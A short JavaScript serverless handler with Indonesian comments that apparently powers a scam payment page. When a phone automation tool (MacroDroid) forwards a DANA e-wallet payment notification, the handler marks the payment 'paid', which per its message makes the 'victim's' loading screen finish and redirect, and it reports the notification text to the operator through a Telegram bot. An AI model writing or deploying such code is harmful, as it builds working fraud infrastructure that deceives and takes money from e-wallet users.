export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  const { textNotif } = req.body;

  const statusApiUrl = `https://${req.headers.host}/api/status`;

  // Ubah status pembayaran menjadi Sukses (paid) secara instan
  await fetch(statusApiUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ mode: "paid" })
  });

  // Berikan notifikasi log konfirmasi ke Telegram Admin
  const pesanLog = `✅ *DANA Masuk Terdeteksi oleh MacroDroid!*\n\n` +
                   `📝 Log Notifikasi: _"${textNotif || 'Mutasi Berhasil'}"_\n\n` +
                   `Layar loading korban otomatis berubah menjadi Selesai dan langsung dialihkan.`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: pesanLog, parse_mode: "Markdown" })
  });

  res.status(200).json({ success: true });
}
